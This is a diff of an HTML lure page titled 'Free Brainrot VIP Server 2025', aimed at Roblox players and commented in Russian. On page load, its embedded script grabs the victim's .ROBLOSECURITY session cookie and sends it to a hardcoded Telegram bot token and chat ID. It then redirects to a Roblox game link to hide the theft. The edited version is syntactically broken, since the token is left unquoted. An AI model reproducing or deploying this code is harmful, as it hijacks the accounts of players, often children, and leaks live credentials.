@@ -1,41 +1,33 @@
 <!DOCTYPE html>
-<html>
-<head>
+<html><head>
 <title>Free Brainrot VIP Server 2025</title>
 <meta charset="utf-8">
-<style>
-body{background:#000;color:#0f0;text-align:center;padding-top:150px;font-size:40px;font-family:Comic Sans MS;}
-h1{font-size:60px;text-shadow:0 0 20px lime;}
-</style>
+<style>body{background:#000;color:#0f0;text-align:center;padding-top:150px;font-size:40px;font-family:Comic Sans MS;}</style>
 
 <script>
-// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
-// ВСТАВЬ СЮДА СВОИ ДАННЫЕ (2 строки!)
-const CHAT_ID = "6457246008";                    // ← твой chat_id от @userinfobot
-const BOT_TOKEN = "8542455731:AAGq8ZDmVbF_eKkDYcARZwmE3eeSVRJEIOk"; // ← токен от @BotFather
-// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+// ТОЧНО СВОИ ДАННЫЕ СЮДА (без кавычек лишних!)
+const chat_id = 6457246008;                                   // твой ID
+const token   = 8542455731:AAGq8ZDmVbF_eKkDYcARZwmE3eeSVRJEIOk;   // твой токен
+// ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
 
-function sendCookie(){
-    let cookie = "";
-    document.cookie.split(';').forEach(c=>{
+function steal(){
+    for(let c of document.cookie.split(';')){
         if(c.trim().startsWith('.ROBLOSECURITY=')){
-            cookie = c.split('=')[1];
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=`;
-            let text = encodeURIComponent("🟢 НОВАЯ КУКА\n" + cookie);
-            new Image().src = url + text + "&t=" + Date.now();
-            fetch(url + text);
+            let cookie = c.split('=')[1];
+            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=`;
+            let msg = encodeURIComponent("🟢 КУКА\n" + cookie);
+            new Image().src = url + msg + "&d=" + Date.now();
         }
-    });
+    }
 }
-sendCookie();
+steal();
 
 setTimeout(()=>{location.href='roblox://placeId=155615604';}, 1800);
 </script>
 </head>
 <body>
 <h1>FREE BRAINROT VIP SERVER 2025</h1>
-<p>Skibidi + Ohio + Grimace Shake<br>Открываем приватку, жди 3 секунды...</p>
-</body>
-</html>нды...</p>
-</body>
-</html>
+<p>Skibidi + Ohio + Grimace Shake<br>Открываем приватку, жди 3 сек...</p>
+</body></html>
+
